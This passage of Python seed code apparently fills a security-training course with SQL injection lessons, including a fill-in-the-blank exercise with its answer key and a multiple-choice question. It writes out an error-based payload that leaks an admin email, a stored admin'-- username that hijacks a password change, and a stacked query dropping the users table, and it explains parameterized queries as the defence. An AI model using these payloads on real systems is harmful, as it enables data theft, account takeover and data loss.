    db.session.add(LessonStep(lesson_id=l5_4.id, order_index=1, kind="fitb", title="FILL IN THE BLANK", prompt="Complete the subquery to extract the admin's email address via error-based injection (SQL Server):\\n```sql\\n' AND 1 = CONVERT(int, (____________________________))--\\n```\\n**Expected Answer**: `SELECT TOP 1 email FROM users WHERE username = 'admin'`\\n**Acceptable variations**: `SELECT email FROM users WHERE username='admin'`", options=_j([]), correct_answer=_j([""]), explanation="*`CONVERT(int, ...)` tries to convert the email string to an integer, which fails and includes the email value in the error message.*\\n---", hints=_j([])))
    l5_5 = Lesson(module_id=m5.id, order_index=5, title="Second-Order SQL Injection", narrative="**Narrative**: *Most SQL injection is \"first-order\" — the malicious input is used immediately. But what about second-order injection, where the payload is **stored** and triggered later?*\\n**Scenario**:\\n**💡 Key Insight**: *The registration was safe. The vulnerability was in a completely different function that trusted data already in the database. This is why defense must be applied at **every** query, not just at input time.*", code_snippet="Step 1: Attacker REGISTERS with username: admin'--\\n        → The app safely uses parameterized queries for INSERT\\n        → Username 'admin'--' is stored in the database\\n\\nStep 2: Attacker changes their password\\n        → The app builds a query using the STORED username:\\n        \\n        query = f\"UPDATE users SET password = '{new_pass}' WHERE username = '{stored_username}'\"\\n        \\n        Becomes:\\n        UPDATE users SET password = 'hacked123' WHERE username = 'admin'--'\\n        \\n        → The admin's password is changed to 'hacked123'!", code_language="", table_data=None)
    db.session.add(l5_5)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l5_5.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="A developer argues: \"We're safe from SQL injection because we validate all user input before storing it in the database.\"\\nWhy might this be insufficient?", options=_opts(("A", "A) Input validation can always be bypassed"), ("B", "B) Stored data might be used unsafely in later queries (second-order injection)"), ("C", "C) Databases don't support input validation"), ("D", "D) Validation only works for numbers, not strings")), correct_answer="\"B\"", explanation="Even if data is validated and safely stored, a different part of the application might retrieve that data and use it in an unsafe query later. Defense must happen at the query level (parameterized queries), not just at the input level.", hints=_j([])))
    l5_6 = Lesson(module_id=m5.id, order_index=6, title="Advanced: Stacked Queries", narrative="**Narrative**: *Some databases allow you to execute multiple queries separated by a semicolon. This opens the door to destructive attacks.*\\n**Support by database**:", code_snippet="-- Normal query:\\nSELECT * FROM products WHERE id = 1\\n\\n-- Stacked query injection:\\nSELECT * FROM products WHERE id = 1; DROP TABLE users; --\\n\\n-- Two queries execute:\\n-- 1. SELECT * FROM products WHERE id = 1\\n-- 2. DROP TABLE users   ← 💀 ENTIRE USER TABLE DELETED", code_language="sql", table_data=None)
